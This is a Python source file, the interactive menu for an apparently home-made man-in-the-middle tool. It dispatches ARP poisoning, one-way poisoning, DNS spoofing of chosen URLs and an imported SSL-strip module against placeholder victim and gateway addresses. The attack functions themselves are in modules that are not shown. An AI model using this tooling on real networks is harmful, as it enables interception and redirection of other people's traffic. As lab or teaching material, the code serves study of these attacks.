from arpPoison import *
from dnsPoison import *
from sslStrip import *
from setup import *

hwA,hwV,ipV,ipG = "attacker MAC","victim MAC","victim IP","gateway IP"

urlsToSpoof = {} 
addrs = {hwA:"00:00:00:00:00:00",hwV:"00:00:00:00:00:00",ipV:"0.0.0.0",ipG:"0.0.0.0"}
interface = "enp0s3"

print("")
print("Welcome to the tool, this tool is a console style tool.")
print("For the list of commands use the command 'help'")
print("For more info on a command use the command 'help [command]'")
print("to close or reset the tool, use the input 'ctrl+c'")

showAddrs(addrs)
showUrlsToSpoof(urlsToSpoof)
interface = getInterface(interface)

runner = True

while runner:
    user_in = raw_input("\n>>> ")
        
    if(user_in == "help"):
        print("")
        print("Here is a list of commands you can use:")
        print("help\nhelp [command]\nmimattack\nonewaypoisoning\nsetinterface\nshowaddrs\nsetaddrs\nshowurls\naddurls\nreseturls\ndnspoisoning")
    
    elif(user_in == "help help"):
        print("")
        print("'help' command is used to list all the commands available to user.")
        print("it can also be used in the format 'help [command]' to get more info on the specified command.")
        
    elif(user_in == "mimattack"):
        mimAttack(interface)
        
    elif(user_in == "onewaypoisoning"):
        oneWayPoisoning(interface)

    elif(user_in == "showurls"):
        showUrlsToSpoof(urlsToSpoof)

    elif(user_in == "addurls"):
        urlsToSpoof = inputUrlsToSpoof(urlsToSpoof)

    elif(user_in == "reseturls"):
        urlsToSpoof = {}

    elif(user_in == "dnspoisoning"):
        dnsPoisoning(urlsToSpoof)
        
    else:
        print("Command not found")
        print("For the list of commands use the command 'help'")
